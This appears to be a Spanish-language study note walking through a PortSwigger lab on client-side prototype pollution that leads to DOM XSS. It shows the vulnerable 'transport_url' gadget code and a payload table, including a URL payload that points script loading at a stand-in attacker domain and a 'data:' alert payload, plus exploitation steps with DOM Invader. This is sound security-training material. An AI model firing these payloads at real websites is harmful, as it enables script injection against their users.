---
aliases:
  - PP 002 - client-side DOM XSS
  - transport_url gadget
tags:
  - vuln/prototype-pollution
  - example
  - portswigger
---

# 002 — Gadget client-side → DOM XSS (`transport_url` / `value`)

> Lab: [DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution) · Practitioner · → [[vulnerabilities/020-prototype-pollution/prototype-pollution|entry point]]

## Qué muestra
El caso client-side clásico: una librería lee una opción de config que **el dev nunca definió** (`transport_url`, `value`) y la usa para armar `script.src`. La contaminás vía URL y el `<script>` carga tu payload → **DOM XSS**. Lo pesado (encontrar source + gadget) lo hace **DOM Invader**.

## El gadget (código vulnerable típico)
```javascript
let transport_url = config.transport_url || defaults.transport_url;
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```
Si `config.transport_url` no está definido, lo controlás por prototype pollution.

## Payload

| Paso | Payload | Efecto |
| --- | --- | --- |
| Confirmar | `?__proto__[foo]=bar` | <mark style="background:#a5d6a7;color:#111">`Object.prototype.foo == "bar"`</mark> en consola |
| Explotar (redirect) | `?__proto__[transport_url]=//evil-user.net` | `script.src` apunta a tu dominio |
| Explotar (XSS) | `?__proto__[transport_url]=data:,alert(1);//` | <mark style="background:#ffcc80;color:#111">`<script src="data:,alert(1);//example.js">`</mark> ejecuta `alert(1)` |

## Diagrama

```mermaid
sequenceDiagram
    autonumber
    participant At as Atacante
    participant V as Víctima (navegador)
    Note over At: URL con ?__proto__[transport_url]=data:,alert(1);//
    At->>V: la víctima abre la URL
    Note over V: la librería lee config.transport_url (heredado del prototipo contaminado)
    Note over V: crea <script src="data:,alert(1);//..."> → sink
    V-->>V: ejecuta alert(1) (DOM XSS)
```

## Por qué funciona
`transport_url` es un **gadget**: la app lo lee sin definirlo, hereda tu valor del `Object.prototype` contaminado, y ese valor viaja a un **sink** (`script.src`).

## Cómo explotarlo (paso a paso)
1. Abrí el lab en el navegador de Burp con **DOM Invader** + opción *prototype pollution*.
2. Recargá → DOM Invader marca la source. **Scan for gadgets** → encuentra `transport_url` y suele generar el PoC.
3. Cargá `?__proto__[transport_url]=data:,alert(1);//` → salta `alert`.

## Verificación
- Al cargar la URL se dispara `alert()` solo (no hace falta interacción).

## Detalles que se pasan por alto
- Si el bracket no anda, probá **notación de punto** (`?__proto__.foo=bar`) — lab del vector alternativo (gadget `sequence` → `eval`).
- Otros gadgets client-side: `value` (browser APIs), `sequence`, `hitCallback` (→ `setTimeout()` vía `#` fragmento).

→ Siguiente: [[vulnerabilities/020-prototype-pollution/examples/003-server-side-deteccion-a-ciegas|003 · detección server-side a ciegas]]
